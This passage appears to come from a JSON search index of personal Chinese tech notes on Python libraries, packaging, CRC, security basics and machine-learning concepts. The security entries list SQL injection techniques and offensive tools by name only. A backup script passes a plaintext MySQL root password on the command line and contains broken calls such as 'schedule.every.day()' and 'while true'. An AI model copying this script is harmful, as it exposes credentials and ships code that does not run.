Logger，Handler，Filter，Formatter； fileConfig fileConfig 则是通过一个文件进行配置； listen listen 则监听一个网络端口，通过接收网络数据来进行配置。 除此之外, 也可以直接调用 Logger，Handler 等对象中的方法在代码中来显式配置, 如: import logging _logger = logging.getLogger(__name__) # 之后调用跟普通调用一样 _logger.info('info msg') 说明: logger只是一个日志器, 真正处理的的handler, 然后handler可以设置 Filter 和 Formatter 参考:: https://zhuanlan.zhihu.com/p/425678081 将单独的logger记录到日志文件 无论对 logging.getLogger('someLogger') 进行多少次调用，都会返回同一个 logger 对象的引用。 不仅在同一个模块内如此，只要是在同一个 Python 解释器进程中，跨模块调用也是一样。 同样是引用同一个对象，应用程序也可以在一个模块中定义和配置一个父 logger， 而在另一个单独的模块中创建（但不配置）子 logger，对于子 logger 的所有调用都会传给父 logger。 比如在一个单独的logger下添加到其他位置: 定义一个普通logger: logger = logging.getLogger(__name__) logger.setLevel(logging.DEBUG) 定义一个文件处理logger: logger_file_handler = logging.FileHandler('log_test.log') logger_file_handler.setLevel(logging.DEBUG) 定义一个流handler的logger: logger_stream_handler = StreamHandler() logger_stream_handler.setLevel(logging.INFO) 可以先设置一下格式: formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s') logger_file_handler.setFormatter(formatter) logger_stream_handler.setFormatter(formatter) 将文件和流的logger作为子logger加入到最开始的普通logger: logger.addHandler(logger_file_handler) logger.addHandler(logger_stream_handler) 详细见:: logging --- Python 的日志记录工具 日志操作手册 日志没输出到控制台 从两个方面看: 设置日志输出级别 设置流式输出(即控制台输出)的handler 例: # 获取处理器 _logger = logging.getLogger(__name__) # 实例 stream handler _console_handler = logging.StreamHandler() # 给处理器增加handler _logger.addHandler(_console_handler) # 设置日志级别 _logger.setLevel(logging.INFO)","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-logging.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-logging.html"},{"title":"string","text":"官网: https://docs.python.org/zh-cn/3/library/string.html 常见的字符串操作 字符串常量 此模块中定义的常量为： string.ascii_letters 下文所述 ascii_lowercase 和 ascii_uppercase 常量的拼连。 该值不依赖于语言区域。 string.ascii_lowercase 小写字母 'abcdefghijklmnopqrstuvwxyz'。 该值不依赖于语言区域，不会发生改变。 string.ascii_uppercase 大写字母 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'。 该值不依赖于语言区域，不会发生改变。 string.digits 字符串 '0123456789'。 string.hexdigits 字符串 '0123456789abcdefABCDEF'。 string.octdigits 字符串 '01234567'。 string.punctuation 由在 C 区域设置中被视为标点符号的 ASCII 字符所组成的字符串: !\"#$%&'()*+,-./:;<=>?@[\\]&#94;_`{|}~. string.printable 由被视为可打印符号的 ASCII 字符组成的字符串。 这是 digits, ascii_letters, punctuation 和 whitespace 的总和。 string.whitespace 由被视为空白符号的 ASCII 字符组成的字符串。 其中包括空格、制表、换行、回车、进纸和纵向制表符。 自定义字符串格式化","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-string.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-string.html"},{"title":"py2app","text":"与 /docs/后端/python/python三方库/pyinstaller 结合使用, 构建程序包 使用 py2app 在哪个平台打包就生成哪种文件 安装: pip install py2app","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-py2app.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-py2app.html"},{"title":"pyinstaller","text":"python打包程序 安装: pip install pyinstaller 使用 /docs/后端/python/python三方库/py2app 在哪个平台打包就生成哪种文件 与py2app结合使用(MacOS) =======================================s 安装好pyinstaller和py2app后, cd进去项目目录 我的目录结构: . ├── img │ ├── img.png │ ├── img_1.png │ └── img_2.png └── t_sheep.py 生成setup文件 会自动识别资源文件跟图标的(mac会): py2applet --make-setup t_sheep.py img logo.icns 目录: ├── img │ ├── img.png │ ├── img_1.png │ └── img_2.png ├── setup.py # 这个就是生成的 └── t_sheep.py 打包: python3 setup.py py2app 目录: . ├── build │ └── bdist.macosx-12-x86_64 ├── dist │ └── t_sheep.app # 这个就是mac下的应用程序, ├── img │ ├── img.png │ ├── img_1.png │ └── img_2.png ├── setup.py └── t_sheep.py 完成后会在当前目录下的dist目录下有应用, 注意 setup 的资源配置: \"\"\" This is a setup.py script generated by py2applet Usage: python setup.py py2app \"\"\" from setuptools import setup APP = ['t_sheep.py'] DATA_FILES = [] OPTIONS = { # 指定要打包的第三方库 'includes': ['pygame'], # 指定APP里用到的图片，音效，文件等， # 可以指定文件夹，或是具体的文件 # 指定文件夹就会把整个文件夹都打包 # 这些内容如果放在上面的DATA_FILES里，也可以达到同等效果 # 资源文件 'resources': ['img'], # APP执行时显示的图标，icns是MAC图标的标准文件 # 生成图标 https://www.jianshu.com/p/33df84bb52c2 # 'iconfile': 'LOGO.icns', # 有待研究，暂时只设定了版本号 'plist': {'CFBundleShortVersionsString': '0.1.0'}, # 参考: https://py2app.readthedocs.io/en/latest/options.html#option-reference } setup( app=APP, data_files=DATA_FILES, options={'py2app': OPTIONS}, setup_requires=['py2app'], ) MacOS生成应用图标可参考 /docs/操作系统/Mac/图标制作 例如: # 命令格式：sips -z 新图片宽度 新图片高度 原图片名 --out 临时.iconset/新图片完整名 # 注意一定要以 icon_**.png或者icon_**@2x.png格式, 否则会失败 sips -z 16 16 img.png --out tmp.iconset/icon_16x16.png sips -z 32 32 img.png --out tmp.iconset/icon_32x32.png sips -z 128 128 img.png --out tmp.iconset/icon_128x128.png sips -z 256 256 img.png --out tmp.iconset/icon_256x256.png 用.iconset生成.icns(MacOS用图标集合): # 命令格式：iconutil -c icns 临时.iconset -o 名字.icns # 举个栗子：iconutil -c icns tmp.iconset -o logo.icns 这里可参考: https://blog.csdn.net/ypf1024/article/details/114011755","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pyinstaller.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pyinstaller.html"},{"title":"schedule","text":"定时任务处理模块 python定时任务（schedule）: import schedule def job(name): print(\"her name is : \", name) name = \"longsongpong\" schedule.every(10).minutes.do(job, name) # 每隔十分钟执行一次任务 schedule.every().hour.do(job, name) # 每隔一小时执行一次任务 schedule.every().day.at(\"10:30\").do(job, name) # 每天的10:30执行一次任务 schedule.every(5).to(10).days.do(job, name) # 每隔5到10天执行一次任务 schedule.every().monday.do(job, name) # 每周一的这个时候执行一次任务 schedule.every().wednesday.at(\"13:15\").do(job, name) # 每周三13:15执行一次任务 while True: schedule.run_pending() # run_pending：运行所有可以运行的任务 此处学习是由于网络脚本定时器的编写，完成的python脚本代码如下: #!/usr/local/bin/python import schedule import time import os def backup(): os.system(\"cd ~/;\" \"cd ~/sql_backup 2> /dev/null || mkdir sql_backup && cd ~/sql_backup;dir=$(date +'%Y-%m-%d');\" \"mkdir ${dir} 2>/dev/null;\" \"mysqldump -uroot -pduoyiIm trainning_server_db user > ~/sql_backup/${dir}/user.sql;\" \"mysqldump -uroot -pduoyiIm trainning_server_db co_group > ~/sql_backup/${dir}/co_group.sql;\" \"mysqldump -uroot -pduoyiIm trainning_server_db co_group_mem > ~/sql_backup/${dir}/co_group_mem.sql;\" \"mysqldump -uroot -pduoyiIm trainning_server_db tbl_user_private \" \"> ~/sql_backup/${dir}/tbl_user_private.sql;\") schedule.every.day().at(\"5:00\").do(backup) while true: schedule.run_pending()","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-schedule.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-schedule.html"},{"title":"CRC数据校验","text":"CRC（Cyclic Redundancy Check）循环冗余校验. 百度百科 - 循环冗余检查 是一种根据网上数据包或计算机文件等数据产生简短固定位数校验码的一种散列函数，主要用来检测或校验数据传输或者保存后可能出现的错误。生成的数字在传输或者存储之前计算出来并且附加到数据后面，然后接收方进行检验确定数据是否发生变化。一般来说，循环冗余校验的值都是32位的整数。 校验原理 被除数 除以 除数 = 商 发送端 和 接收端 选定一个特定的数 (这里称之且后文都称之为 除数 ) 在 发送端 发送的二进制帧附加一个 二进制校验码 , 生成一个 新的帧 . 注意: 需要保证能与 除数 整除 到达 接受端 , 使用接受到的 新的帧 , 尝试与 除数 整除, 没有余数 就是正确的, 有余数说明数据已被修改. 以上计算使用 模二除法 (没有进位) 模二计算 无进位的二进制计算 模二加法: 0+0=0 0+1=1 1+0=1 1+1=0 模二减法: 0-0=0 0-1=1 1-0=1 1-1=0 模二乘法: 0x0=0 0x1=0 1x0=0 1x1=1 模二除法, 与普通除法类似, 不过加减时使用 模二加减法 示例 选定CRC生成多项式为 G ( X ) = X 4 + X 3 + 1 要求出二进制序列 10110011 的 CRC校验码. 首先, 将 CRC生成多项式 转换为二进制序列 11001 (第一位, 第四位, 第五位是1) 多项式的位数为5, 则在数据帧的后面加上 (5-1) 位 0, 数据帧变为 101100110000 , 然后使用模2除法除以除数 11001 , 得到余数 0100 (若余数位数不足, 在首部补0). 将计算出来的CRC校验码 0100 添加在原始帧的后面, 真正的数据帧为 101100110100 , 再把这个数据帧发送到接收端. 接收端收到数据帧后, 用上面选定的除数, 用模2除法除去, 验证余数是否为0, 如果为0, 则说明数据帧没有出错 看到一篇解释很详细的: 史上解释CRC最清楚的文章","tags":"杂乱无章","url":"/yq-doc-source-docs-Chaotic-CRC-data-verification.html","loc":"/yq-doc-source-docs-Chaotic-CRC-data-verification.html"},{"title":"代码命名","text":"类/函数声明 对于类名, 用名词, 因为表示的是对象 函数, 方法可以加入动词, 因为是表示行为. 命名规范 关于命名规范, 业界一般有以下两种: 驼峰 - 大驼峰: 首字母大小, 后面每个逻辑断点的单词首字母也大写. 如: CatEyes - 小驼峰: 首字母小写, 后面每个逻辑断点的单词首字母大写. 如: catEyes 下划线: 每个逻辑断点处都加下划线. 如: cat_eyes 匈牙利: 变量名=属性+类型+对象描述. 如: m_iVar 除非所在单位有硬性规定, 否则使用时自由的, 混合用也可以. 附: 匈牙利命名法中常用的小写字母的前缀 前缀 类型 i 整型 n 短整型 (Short Int) l 长整型 (Long Int) c 有符号字符 (Char) by 字节 (Byte) w Word b 布尔值 (Boolean) s 字符串型 a 数组 (Array) p 指针(Pointer) lp 长指针(Long Pointer) m_ 类的成员 fn 函数 h Handle（句柄）","tags":"杂乱无章","url":"/yq-doc-source-docs-Chaotic-Code-name.html","loc":"/yq-doc-source-docs-Chaotic-Code-name.html"},{"title":"记录vs下载安装慢的问题","text":"首先获取下载地址, 比如下载vs2022相关软件包, 地址就是 download.visualstudio.microsoft.com (得自己找) 去 DNS查询网站 查询相关改下载地址的相关信息, 然后选择 ttl 最小的那个, 设置DNS dns网站查询 最后去windows修改DNS配置 (效果不一定) 修改dns配置 注解 顺便说一句, 想起之前windows登录微软账号时, 一直链不上网, 后面取消 ipv6 就可以了。","tags":"杂乱无章","url":"/yq-doc-source-docs-Chaotic-Record-the-problem-of-slow-download-vs-download.html","loc":"/yq-doc-source-docs-Chaotic-Record-the-problem-of-slow-download-vs-download.html"},{"title":"渗透测试流程","text":"渗透测试流程 信息收集 -> 漏洞扫描 -> 漏洞利用 -> 权限提升 -> 密码破解 -> 无线网络的渗透 信息收集 工具: dnsenum nmap amap maltego 画网络结构图","tags":"安全","url":"/yq-doc-source-docs-Safety-Penetration-test-process.html","loc":"/yq-doc-source-docs-Safety-Penetration-test-process.html"},{"title":"备忘","text":"HTTrack 克隆网站工具, 静态网页 还有一个 setoolkit 工具也可以 setoolkit 社会工程学工具(social engineering toolkit), 开源, 基于Python. 社会工程学工具 提权 注解 # todo: 为什么需要降权 为什么需要降权? 并不是最高权限就可以做一切... 有点不理解, 后面处理 杂乱无章 加密方式: 对称加密 加解密使用同一钥匙 - DES - AES 非对称加密 加解密使用不同钥匙 - RSA 比如SSH的密钥登陆. HTTPS的证书(公钥大家都有, 用来加密数据, 私钥只有所有者有, 保证只有自己可以看) 技巧 仅靠非对称加密其实也不能真正保证安全, 数据包是在网络上流动的, 其他人可以直接在网络上获取加密后的包下次再直接用这个包. 所以设置超时是有必要的, 比如: 登陆时, 对密码先公钥加密, 再对加密后的数据加时间戳后再次加密, 保证了每次发包数据是不一样的, 后端再设置一个较小的过期验证时间, 超时拒绝登陆. 不过也有一个问题, 再登陆有效期内, 还是可以被使用登陆. 只能尽量保证登陆有效期足够小等措施了. MAC地址结构 如: AA:BB:CC:DD:EE:FF 前三位 AA:BB:CC 表示厂商 后三位 DD:EE:FF 表示厂商分配的设备标识","tags":"安全","url":"/yq-doc-source-docs-Safety-Some-memo.html","loc":"/yq-doc-source-docs-Safety-Some-memo.html"},{"title":"漏洞缺陷分类","text":"产品缺陷 技术缺陷 管理缺陷 业务缺陷 人性漏洞(...) SQL注入漏洞 漏洞-获取数据 基于mysql延时 - sleep 基于mysql报错 - group_by - updatexml - extractvalue 漏洞-注入 基于user-agent sqlmap自动注入工具","tags":"安全","url":"/yq-doc-source-docs-Safety-Vulnerable-defect-classification.html","loc":"/yq-doc-source-docs-Safety-Vulnerable-defect-classification.html"},{"title":"颜色空间","text":"颜色空间也称彩色模型，用于描述色彩 常见的颜色空间包括 RGB、CMYK、YUK、L*A*B*、HSL和HSV/HSB等 RGB 最常用 工业界一种颜色标准 对 红绿蓝三个颜色通道的变化以及相互叠加来得到各式各样的颜色 每个通道各分为256阶 CMYK 主要用于纺织、上色 YUK 智能设备出图 HSV HSV色彩模式 色相(Hue) 物体传导或反射的波长。更常见的是以颜色比如红色，橘色或绿色来辨识，取 0-360 度的数值来衡量 饱和度(Saturation) 又称色度，是指色彩的强度或纯度，取值范围为 0%-100% 明度(Value) 表示颜色明亮的程度，取值范围为 0%(黑)-100%(白) other 灰度图","tags":"AI","url":"/yq-doc-source-docs-AI-Computer-vision-Color-space.html","loc":"/yq-doc-source-docs-AI-Computer-vision-Color-space.html"},{"title":"计算机视觉","text":"","tags":"AI","url":"/yq-doc-source-docs-AI-Computer-vision-index.html","loc":"/yq-doc-source-docs-AI-Computer-vision-index.html"},{"title":"贝叶斯","text":"贝叶斯定理由英国数学家贝叶斯 ( Thomas Bayes 1702-1761年) 发展， 用来描述两个条件概率之间的关系，比如: P(A|B) 和 P(B|A) 按照乘法法则，可以立刻导出: P(A∩B) = P(A)*P(B|A)=P(B)*P(A|B) 如上公式也可变形为: P(A|B)=P(B|A)*P(A)/P(B) 得到 事件A在事件B(发生)的条件下的概率 贝叶斯公式又被称为贝叶斯定理, 贝叶斯规则是概率统计中的应用所观察到的现象对有关概率分布的主观判断（即先验概率）进行修正的标准方法。 公式 其中，P(A)可以称之为先验概率，P(A|B)是后验概率 应用场景：某些情况下很难得到 P(A|B)，所有根据别的来算 例子, 现分别有 A、B 两个容器， 在容器 A 里分别有 7 个红球和 3 个白球， 在容器 B 里有 1 个红球和 9 个白球， 现已知从这两个容器里任意抽出了一个红球，问这个球来自容器 A 的概率是多少? 假设已经抽出红球为事件 B， 选中容器 A 为事件 A， 则有: P(B) = 8/20 P(A) = 1/2 P(B|A) = 7/10 按照公式，则有: P(A|B) = (7/10)*(1/2) / (8/20) = 0.875 参考: 百度百科-贝叶斯 正向概率与逆向概率 正向概率 假设袋子有N个白球，M个黑球，求摸一次为黑球的概率 逆向概率 如果我们事先不知道袋子里面黑白球比例，而是随机摸出一个（或几个）球，观察这些取出球的颜色，可以对袋子中黑白球的比例做出一个预测","tags":"AI","url":"/yq-doc-source-docs-AI-Deep-learning-Bayez.html","loc":"/yq-doc-source-docs-AI-Deep-learning-Bayez.html"},{"title":"卡尔曼滤波","text":"","tags":"AI","url":"/yq-doc-source-docs-AI-Deep-learning-Carman-Filter.html","loc":"/yq-doc-source-docs-AI-Deep-learning-Carman-Filter.html"},{"title":"Deep Neural Networks(DNN)","text":"深度神经网络（Deep Neural Networks， 简称DNN）是深度学习的基础 感知机 对输入响应输出, 可以将其当多单个神经元 神经网络 基于感知机的扩展，而DNN可以理解为有很多隐藏层的神经网络。 多层神经网络和深度神经网络DNN其实也是指的一个东西， DNN有时也叫做多层感知机（Multi-Layer perceptron,MLP）。 从DNN按不同层的位置划分，DNN内部的神经网络层可以分为三类， 输入层，隐藏层和输出层. 一般来说第一层是输入层，最后一层是输出层，而中间的层数都是隐藏层。 层与层之间是全连接的. 也就是说，第i层的任意一个神经元一定与第i+1层的任意一个神经元相连。 虽然DNN看起来很复杂，但是从小的局部模型来说， 还是和感知机一样，即一个线性关系: z = wx + b 加上一个激活函数: ø(z)","tags":"AI","url":"/yq-doc-source-docs-AI-Deep-learning-DNN.html","loc":"/yq-doc-source-docs-AI-Deep-learning-DNN.html"},{"title":"人脸识别","text":"由于训练集往往只有一张图片，所以需要比较的是差异值，即使用Similarity函数 Similarity: d(img1,img2)=degree of difference between images 比较距离编码 Siamese网络 三元组损失 同时看三张图片，属于同一个人的编码距离较小，反之较大 尽量选择差距小的图片来增大训练难度 转换为分类问题 选取两个神经网络，将两个结果再次输入到逻辑回归单元，","tags":"AI","url":"/yq-doc-source-docs-AI-Deep-learning-Face-recognition.html","loc":"/yq-doc-source-docs-AI-Deep-learning-Face-recognition.html"},{"title":"图像识别","text":"YOLO算法 使用滑动窗口预测每一个格子（比如 3x3，19x19） 在滑动窗口的基础上，将图片映射在 [0, 1] 之间，取交并比大于阈值的结果 对于检测窗口无结果的检测，出第一个概率p为0，其他输出都不用关心（不参与梯度计算） YOLO 算法训练时，只有一个包含对象中心的一个单元负责检测这个对象 交并比 (Intersection over Union) 计算两个边界框交集与并集之比 一般约定 iou >= 0.5，即检测正确 非最大值抑制 (Non-max Suppression) 确保算法对每个对象值检测一次 步骤 去掉概率小于阈值的结果 选择概率最高的 anchor box 自定义形状框，每个框都会有一个输出结果值 R-CNN 算法 先求出候选区域","tags":"AI","url":"/yq-doc-source-docs-AI-Deep-learning-Image-Identification.html","loc":"/yq-doc-source-docs-AI-Deep-learning-Image-Identification.html"},{"title":"模型训练可视化模块","text":"visdom 启动 visdom server: python -m visdom.server 这一步会有一个下载的过程，会比较慢 使用举例: import visdom import numpy as np vis = visdom.Visdom() vis.text('he') vis.image(np.ones((3, 10, 10))) tensorboardx 使用, 先生成一个示例: from tensorboardX import SummaryWriter writer = SummaryWriter('log') for i in range(100): writer.add_scalar('a', i, global_step=i) writer.add_scalar('b', i**2, global_step=i) writer.close() 启动: cd log tensorboard --log-dir ./","tags":"AI","url":"/yq-doc-source-docs-AI-Deep-learning-Model-training-visualization-module.html","loc":"/yq-doc-source-docs-AI-Deep-learning-Model-training-visualization-module.html"},{"title":"自然语言处理","text":"时序模型 构建 one-hot模型 对于某个时间步t， RNN会计算 $$ P(y&#94;{<t>}|y&#94;{<1>}, y&#94;{<2>}, y&#94;{<3>}, ... y&#94;{<t-1>} ) $$ 梯度爆炸 -- NaN （出现数值溢出）， 可以采用梯度修剪, 即 当大于某一个阈值，就使用调整后的值 RNN 分类（常见） 多对多 比如机器翻译，机器翻译一般需要解码器，貌似是为了适配长度不一致的问题 多对一 比如情感分类问题（正/负面评价打分） GRU 与 LSTM GRU LSTM 长短时记忆网络 双向循环神经网络 BRNN 深层循环神经网络 DRNN 其实就是纵向叠加隐藏层","tags":"AI","url":"/yq-doc-source-docs-AI-Deep-learning-Natural-language-processing.html","loc":"/yq-doc-source-docs-AI-Deep-learning-Natural-language-processing.html"},{"title":"数据预处理","text":"数据的归一化和标准化是特征缩放(feature scaling)的方法， 是数据预处理的关键步骤。 不同评价指标往往具有不同的量纲和量纲单位， 这样的情况会影响到数据分析的结果， 为了消除指标之间的量纲影响，需要进行数据归一化/标准化处理， 以解决数据指标之间的可比性。 原始数据经过数据归一化/标准化处理后，各指标处于同一数量级，适合进行综合对比评价。 归一化/标准化实质是一种线性变换，线性变换有很多良好的性质， 这些性质决定了对数据改变后不会造成\"失效\"，反而能提高数据的表现， 这些性质是归一化/标准化的前提。 比如有一个很重要的性质：线性变换不会改变原始数据的数值排序。 优点 归一化/标准化后可以加快梯度下降的求解速度 避免局部值偏差太大 归一化 归一化（Normalization） 归一化一般是将数据映射到指定的范围，用于去除不同维度数据的量纲以及量纲单位。 在机器学习领域中，不同评价指标（即特征向量中的不同特征就是所述的不同评价指标）往往具有不同的量纲和量纲单位，这样的情况会影响到数据分析的结果， 为了消除指标之间的量纲影响，需要进行数据标准化处理， 以解决数据指标之间的可比性。原始数据经过数据标准化处理后， 各指标处于同一数量级，适合进行综合对比评价。其中，最典型的就是数据的归一化处理。 常见的映射范围有 [0, 1] 和 [-1, 1] ，最常见的归一化方法就是 Min-Max 归一化。 Min-Max 归一化 Min-Max 归一化（Min-Max Normalization） 也称为离差标准化，是对原始数据的线性变换，使结果值映射到[0 - 1]之间。转换函数如下： 其中max为样本数据的最大值，min为样本数据的最小值。 这种归一化方法比较适用在数值比较集中的情况。 但是，如果max和min不稳定，很容易使得归一化结果不稳定，使得后续使用效果也不稳定， 实际使用中可以用经验常量值来替代max和min。 而且当有新数据加入时，可能导致max和min的变化，需要重新定义。 作用： 数据映射到指定的范围内进行处理，更加便捷快速。 把有量纲表达式变成无量纲表达式，便于不同单位或量级的指标能够进行比较和加权。 经过归一化后，将有量纲的数据集变成纯量，还可以达到简化计算的作用。 注解 有时候我们希望将输入转换到[-1,1]的范围，可以使用以下的公式: 实质上，归一化的一般规范函数是: y = (ymax-ymin)*(x-xmin)/(xmax-xmin) + ymin。 标准化 标准化（Normalization） 注解 归一化和标准化的英文翻译是一致的，但是根据其用途（或公式）的不同去理解（或翻译） 标准化是依照特征矩阵的列处理数据。 数据标准化方法有多种， 如：直线型方法(如极值法、标准差法)、折线型方法(如三折线法)、曲线型方法(如半正态性分布)。 不同的标准化方法，对系统的评价结果会产生不同的影响。其中，最常用的是Z-Score 标准化。 Z-Score 标准化 Z-Score 标准化（Z-Score Normalization） 这种方法给予原始数据的均值（mean）和标准差（standard deviation）进行数据的标准化。 经过处理的数据符合标准正态分布，即均值为0，标准差为1，转化函数为 其中 u 是样本数据的均值（mean）， o 是样本数据的标准差（std）。 此外，标准化后的数据保持异常值中的有用信息， 使得算法对异常值不太敏感，这一点归一化就无法保证。 作用: 提升模型的收敛速度（加快梯度下降的求解速度） 提升模型的精度（消除量级和量纲的影响） 简化计算（与归一化的简化原理相同） 归一化和标准化的异同 区别 归一化是将样本的特征值转换到同一量纲下把数据映射到[0,1]或者[-1, 1]区间内， 仅由变量的极值决定，因区间放缩法是归一化的一种。 标准化是依照特征矩阵的列处理数据，其通过求z-score的方法， 转换为标准正态分布，和整体样本分布相关，每个样本点都能对标准化产生影响。 相同 它们的相同点在于都能取消由于量纲不同引起的误差； 都是一种线性变换，都是对向量X按照比例压缩再进行平移。 归一化和标准化的适用场景 数据的分布本身就服从正态分布，使用Z-Score标准化 有离群值的情况：使用Z-Score 这里不是说有离群值时使用Z-Score不受影响， 而是，Min-Max对于离群值十分敏感，因为离群值的出现， 会影响数据中max或min值，从而使Min-Max的效果很差。 相比之下，虽然使用Z-Score计算方差和均值的时候仍然会受到离群值的影响， 但是相比于Min-Max法，影响会小一点 如果对输出结果范围有要求，用归一化 如果数据较为稳定，不存在极端的最大最小值，用归一化 如果数据存在异常值和较多噪音，用标准化，可以间接通过中心化避免异常值和极端值的影响 非线性变换 非线性变换经常用在数据分化比较大的场景，有些数值很大，有些很小。通过一些数学函数，将原始值进行映射。该方法包括 log、指数，正切等。需要根据数据分布的情况，决定非线性函数的曲线，比如log(V, 2)还是log(V, 10)等。 对数函数转换: y = log10(x) 反余切函数转换: y = atan(x) * 2 / π 参考:: 数据预处理：归一化和标准化 如何理解归一化（normalization）","tags":"AI","url":"/yq-doc-source-docs-AI-Deep-learning-Pre--processing.html","loc":"/yq-doc-source-docs-AI-Deep-learning-Pre--processing.html"},{"title":"风格迁移","text":"隶属于图像操作 注解 时隔两年, 已经忘了这些东西是啥玩意儿了 代价函数定义 图片一 C， 图片二 S， 风格迁移后的图片 G 内容代价函数 风格代价函数 注： i, j, k 表示高，宽，通道 总代价函数 更新的是生成图像的像素点的值","tags":"AI","url":"/yq-doc-source-docs-AI-Deep-learning-Style-migration.html","loc":"/yq-doc-source-docs-AI-Deep-learning-Style-migration.html"},{"title":"深度学习","text":"卷积 信号分析 一个输入信号f(t)，经过一个线性系统（其特征可以用单位冲击响应函数g(t)描述）以后， 输出信号应该是什么？实际上通过卷积运算就可以得到输出信号。 图像处理 输入一幅图像f(x,y)，经过特定设计的卷积核g(x,y)进行卷积处理以后，输出图像将会得到模糊，边缘强化等各种效果。 卷积的\"卷\"，指的的函数的翻转，从 g(t) 变成 g(-t) 的这个过程； 同时，\"卷\"还有滑动的意味在里面（吸取了网友李文清的建议）。 如果把卷积翻译为\"褶积\"，那么这个\"褶\"字就只有翻转的含义了。 卷积的\"积\"，指的是积分/加权求和。 对卷积的意义的理解： 从\"积\"的过程可以看到，我们得到的叠加值，是个全局的概念。 以信号分析为例，卷积的结果是不仅跟当前时刻输入信号的响应值有关， 也跟过去所有时刻输入信号的响应都有关系，考虑了对过去的所有输入的效果的累积。 在图像处理的中，卷积处理的结果，其实就是把每个像素周边的， 甚至是整个图像的像素都考虑进来，对当前像素进行某种加权处理。 所以说，\"积\"是全局概念，或者说是一种\"混合\"，把两个函数在时间或者空间上进行混合。 那为什么要进行\"卷\"？直接相乘不好吗？ 进行\"卷\"（翻转）的目的其实是施加一种约束， 它指定了在\"积\"的时候以什么为参照。 在信号分析的场景，它指定了在哪个特定时间点的前后进行\"积\"， 在空间分析的场景，它指定了在哪个位置的周边进行累积处理。 参考: 如何通俗易懂地解释卷积？ 本地PDF: ../../../resources/pdf/如何通俗易懂地解释卷积？ - 知乎.pdf 一次重构自己的一个DNN模型发现的问题 交叉墒损失函数引起的bug 重构的时候发现一个bug 感觉是python底层解析执行的问题，向量化计算会失败, 出bug代码 向量化的计算结果与实际不一致 bug示例，部分截图 有意思的是，专门写了一个测试把原有数据拿去测试，居然复现不出 排查到凌晨，发现是这个问题。。。具体原因还没找到，只找到bug点。 先记录一下，以后再研究","tags":"AI","url":"/yq-doc-source-docs-AI-Deep-learning-index.html","loc":"/yq-doc-source-docs-AI-Deep-learning-index.html"},{"title":"方差与标准差","text":"方差和标准差都是用来度量数据的离散程度，即表征一组数据分布情况的统计量。 方差(variance) 所有数据与均值之差的平方和的平均值， 它反映了数据的波动程度，也可以用来描述一个随机变量的分布情况。 通俗地来讲， 方差越大，数据的波动就越剧烈，说明数据之间的差异越大； 方差越小，数据的波动就越平稳，说明数据之间的差异越小。 为什么取平方？ 因为随机值和均值比较出现负偏差的时候， 要取反才能和其他值比较，为了比较方便，统一取平方值进行比较. 不用绝对值, 是因为绝对值不可导, 没法求积分(现在数学界啥都要积分可导) 标准差(standard deviation) 方差的平方根，它也是用来衡量数据的离散程度， 但更直观地反映了数据与均值之间的距离，即数据的离散程度。 标准差越大，数据的波动就越大，说明数据之间的差异越大； 标准差越小，数据的波动就越小，说明数据之间的差异越小。 因此，可以通过标准差来判断数据集中的数据点距离均值的程度， 进而对数据的分布情况和变化趋势进行分析和解释。 为什么需要标准差? 可以简单的理解为, 方差如果带上单位, 也把单位给平方了, 比如 单位是m, 方差因为会球平方, 单位就变成了 m&#94;2, 开个根号利于 与原来的数据 xxx m 比较. 标准差和均值的量纲（单位）是一致的，在描述一个波动范围时标准差比方差更方便。 比如一个班男生的平均身高是170cm,标准差是10cm,那么方差就是100cm&#94;2。 可以进行的比较简便的描述是本班男生身高分布是170±10cm，方差就无法做到这点。 这么说可或许不准确, 那换种说法: 假定这个班男生的身高服从正态分布， 则有68.3%的男生身高落在170±10cm这个区间内。 即: 正态分布中: P{μ-σ<X<μ+σ}=68.3%，同理P{μ-2σ<X<μ+2σ}=95.4%，P{μ-3σ<X<μ+3σ}=99.7% # 均可在正态分布概率表格中查询。希望有帮助。 再举个例子，从正态分布中抽出的一个样本落在[μ-3σ, μ+3σ]这个范围内的概率是99.7%， 也可以称为\"正负3个标准差\"。如果没有标准差这个概念， 我们使用方差来描述这个范围就略微绕了一点。 万一这个分布是有实际背景的，这个范围描述还要加上一个单位， 这时候为了方便，人们就自然而然地将这个量单独提取出来了。 方差和标准差的区别 方差只有比较意义，没有数字意义； 标准差既有比较意义，也有数字意义。 为什么要通过方差来计算标准差？ 明明是根据标准差的意义推导出的方差， 现在计算标准差，却要先算方差？明明是我先来的，为什么会这样呢？ 因为计算方便，不用考虑不同样本值和均值的正负比较和取反，具有普遍性。 示例: import math def variance(data): n = len(data) mean = sum(data) / n deviations = [(x - mean) ** 2 for x in data] variance = sum(deviations) / n return variance def stdev(data): return math.sqrt(variance(data)) data = [1, 2, 3, 4, 5] print(\"数据集：\", data) print(\"方差：\", variance(data)) print(\"标准差：\", stdev(data))","tags":"AI","url":"/yq-doc-source-docs-AI-Digital-Differential-and-standard-difference.html","loc":"/yq-doc-source-docs-AI-Digital-Differential-and-standard-difference.html"},{"title":"逻辑回归和线性回归","text":"应用领域： 线性回归（Linear Regression） 线性回归用于建立连续型目标变量与一个或多个自变量之间的线性关系。它通常用于预测数值型的输出，如房价预测、销售量预测等。 逻辑回归（Logistic Regression） 逻辑回归用于建立自变量与二元分类目标变量之间的关系。它常用于解决分类问题，如判断邮件是否为垃圾邮件、预测用户是否会购买某个产品等。 输出类型： 线性回归 线性回归的输出是连续的实数值。可以是任意实数，可以是正数、负数或零。 逻辑回归 逻辑回归的输出是概率值，表示属于某个类别的概率。通常使用sigmoid函数将线性组合的结果映射到0到1之间的概率。 模型形式： 线性回归 线性回归模型假设自变量与因变量之间存在线性关系。 模型形式可以表示为: Y = b0 + b1X1 + b2X2 + ... + bn*Xn 其中Y是因变量，X1, X2, ..., Xn是自变量，b0, b1, b2, ..., bn是回归系数。 逻辑回归 